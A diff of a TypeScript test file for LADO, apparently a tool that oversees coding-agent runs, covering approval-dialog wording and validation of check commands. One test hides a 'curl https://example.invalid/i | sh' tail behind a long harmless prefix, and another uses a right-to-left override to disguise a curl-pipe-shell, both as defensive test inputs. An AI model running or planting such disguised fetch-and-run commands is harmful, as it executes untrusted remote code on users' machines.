@@ -155,8 +155,11 @@ function ceilingRule(overrides: Partial<LadoPresenceRule> = {}): LadoPresenceRul
 
 const changedCeiling = ceilingRule({ ceiling: { mode: "bypass-permissions" }, version: 3, versionId: "lado-rule-version-3" });
 
+// The hash the daemon gives a project without check commands.
+const NO_COMMANDS_SHA = "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945";
+
 function settingsResponse(ladoMode = true): LadoPresenceProjectSettings {
-	return { projectId: "demo", ladoMode, maxConcurrent: 1, checkCommands: [], checkTimeoutMinutes: 30 };
+	return { projectId: "demo", ladoMode, maxConcurrent: 1, checkCommands: [], checkCommandsSha256: NO_COMMANDS_SHA, checkTimeoutMinutes: 30 };
 }
 
 function projectResponse(name = "Demo app"): components["schemas"]["ProjectGetResponse"] {
@@ -340,6 +343,7 @@ function executionResponse(overrides: Partial<ExecutionResponse> = {}): Executio
 		pr: { closed: false, headSha: HEAD, merged: false, number: 7, targetBranch: "main", title: "fix: 로그인 테스트", url: PR_URL },
 		sessionEnded: false,
 		sessionId: "demo-7",
+		state: "integration_pending",
 		snapshot: {
 			agent: "claude-code",
 			permissionCeiling: "auto",
@@ -416,6 +420,7 @@ const integrationApproved: LadoPresenceIntegration = {
 		approvedAt: "2026-10-27T00:06:00Z",
 		headSha: HEAD,
 		id: "lado-integration-1",
+		targetBranch: "main",
 		statusAttempts: 1,
 		statusPostedAt: "2026-10-27T00:06:01Z",
 		statusState: "posted",
@@ -1799,7 +1804,8 @@ describe("approving an integration", () => {
 				"Passed: 3 of 6 verification items",
 				"Commit messages LADO could not judge (1): abcdef1 update",
 				"Changed outside the plan (4): docs/a.md, docs/b.md, src/c.ts, …",
-				"The base branch's rules lack (2): pull_request, required_status_checks:lado/integration",
+				// The parts by the words the app shows them with (U1 of #15).
+				"The base branch's rules lack (2): Pull requests required, lado/integration required",
 				"",
 				"On approval, LADO posts the lado/integration status on this head; LADO itself never merges. " +
 					"This repository is not protected: LADO only detects a merge without approval.",
@@ -1945,6 +1951,53 @@ describe("approving an integration", () => {
 		});
 	});
 
+	// Review fixes of #15: rules LADO could not read may protect the branch
+	// (U4), a check from one app only cannot be LADO's (Q3), and a deleted
+	// local base branch is named (V7).
+	it("words protection and the base branch as they stand", async () => {
+		const withItem = (item: VerifyItem) => confirmItems.map((other) => (other.kind === item.kind ? item : other));
+		const detailOf = async (items: VerifyItem[], confirm: string[]) => {
+			const { approveIntegration, dialog } = setup({}, { integrationPreview: () => json(200, integrationPreview({ items, confirm })) });
+			await approveIntegration({ sessionId: "demo-7" });
+			return dialogOptions(dialog).detail ?? "";
+		};
+		const unknown = await detailOf(
+			withItem({
+				kind: "protection",
+				outcome: "confirm",
+				code: "protection_unknown",
+				details: { provider: "github", repo: "acme/demo", branch: "main", missing: [], errorClass: "http_502", error: "the host answered 502" },
+			}),
+			["commit_messages_unclear", "outside_plan", "protection_unknown"],
+		);
+		expect(unknown).toContain("LADO could not read the base branch's rules: the host answered 502");
+		expect(unknown).not.toContain("This repository is not protected");
+
+		const appBound = await detailOf(
+			withItem({
+				kind: "protection",
+				outcome: "confirm",
+				code: "unprotected",
+				details: { provider: "github", repo: "acme/demo", branch: "main", missing: ["required_status_checks:lado/integration:any_source"] },
+			}),
+			confirmCodes,
+		);
+		expect(appBound).toContain("The base branch's rules lack (1): lado/integration from any source");
+		expect(appBound).toContain("set the check's source to “Any source”");
+		expect(appBound).toContain("This repository is not protected");
+
+		const deleted = await detailOf(
+			withItem({
+				kind: "base_branch",
+				outcome: "confirm",
+				code: "base_deleted",
+				details: { branch: "main", remote: "origin", moved: [], alreadyOnBase: false, dispatchCommit: "c".repeat(40), deleted: true },
+			}),
+			["base_deleted", ...confirmCodes],
+		);
+		expect(deleted).toContain("The local main was at ccccccc when the run started and is gone now.");
+	});
+
 	it("words the confirmation from main's catalog in the current language", async () => {
 		const { approveIntegration, dialog } = setup({ locale: () => "ko" });
 		await approveIntegration({ sessionId: "demo-7" });
@@ -1970,7 +2023,7 @@ describe("changing check commands", () => {
 	it("names the commands added, changed and removed, then signs a change of the commands only", async () => {
 		const next = [
 			{ name: "lint", command: "npm run lint -- --max-warnings 0" },
-			{ name: "build", command: "npm run build\nnpm run e2e" },
+			{ name: "build", command: "npm run build  &&  npm run e2e" },
 		];
 		const saved = withCommands(next);
 		const { changeChecks, calls, dialog, window } = setup({}, {
@@ -1992,7 +2045,8 @@ describe("changing check commands", () => {
 		expect(dialogOptions(dialog).detail).toBe(
 			[
 				"Change lint: npm run lint -- --max-warnings 0",
-				"Add build: npm run build npm run e2e",
+				// Shown as it runs: its spaces are kept (S2 of #15).
+				"Add build: npm run build  &&  npm run e2e",
 				"Remove test",
 				"",
 				"LADO runs these commands in each run's worktree on this computer, outside any agent sandbox.",
@@ -2003,17 +2057,20 @@ describe("changing check commands", () => {
 			["GET", `${BASE}${settingsPath}`],
 			["PUT", `${BASE}${settingsPath}`],
 		]);
-		expectSigned(calls[1]!, "PUT", JSON.stringify({ checkCommands: next }));
+		// The change names the list it compared with (U7 of #15).
+		expectSigned(calls[1]!, "PUT", JSON.stringify({ checkCommands: next, checkCommandsBase: NO_COMMANDS_SHA }));
 	});
 
-	it("names a new order, and cuts a long command", async () => {
+	it("names a new order, and shows a long command whole", async () => {
 		const reordered = setup({}, { settings: () => json(200, withCommands(current)), put: () => json(200, withCommands(current)) });
 		await reordered.changeChecks({ projectId: "demo", commands: [current[1], current[0]] });
 		expect(dialogOptions(reordered.dialog).detail?.split("\n")[0]).toBe("Run order: lint, test");
 
 		const long = setup({}, { settings: () => json(200, withCommands([])), put: () => json(200, withCommands([])) });
-		await long.changeChecks({ projectId: "demo", commands: [{ name: "e2e", command: "x".repeat(500) }] });
-		expect(dialogOptions(long.dialog).detail?.split("\n")[0]).toBe(`Add e2e: ${"x".repeat(300)}…`);
+		// A harmless start cannot hide a tail: the dialog shows all of it (S2 of #15).
+		const tail = `${"x".repeat(300)}; curl https://example.invalid/i | sh`;
+		await long.changeChecks({ projectId: "demo", commands: [{ name: "e2e", command: tail }] });
+		expect(dialogOptions(long.dialog).detail?.split("\n")[0]).toBe(`Add e2e: ${tail}`);
 	});
 
 	it("sends nothing when the human cancels or nothing would change", async () => {
@@ -2041,7 +2098,12 @@ describe("changing check commands", () => {
 			[[command("Test"), command("test")], { index: 1, field: "name", reason: "duplicate" }],
 			[[command("test", "  ")], { index: 0, field: "command", reason: "required" }],
 			[[command("test", "x".repeat(2001))], { index: 0, field: "command", reason: "too_long" }],
-			[[command("test", "npm\0test")], { index: 0, field: "command", reason: "invalid" }],
+			// One command is one line, without direction controls (S2 of #15).
+			[[command("test", "npm\0test")], { index: 0, field: "command", reason: "control_character", position: 4, character: "U+0000" }],
+			[[command("build", "npm run build\nnpm run e2e")], { index: 0, field: "command", reason: "control_character", position: 14, character: "U+000A" }],
+			[[command("build", "make\tall")], { index: 0, field: "command", reason: "control_character", position: 5, character: "U+0009" }],
+			[[command("build", "make\u2028all")], { index: 0, field: "command", reason: "control_character", position: 5, character: "U+2028" }],
+			[[command("build", "make all #\u202ehs | lruc")], { index: 0, field: "command", reason: "bidi_control", position: 11, character: "U+202E" }],
 		];
 		for (const [commands, details] of cases) {
 			const { changeChecks, dialog, fetch } = setup();
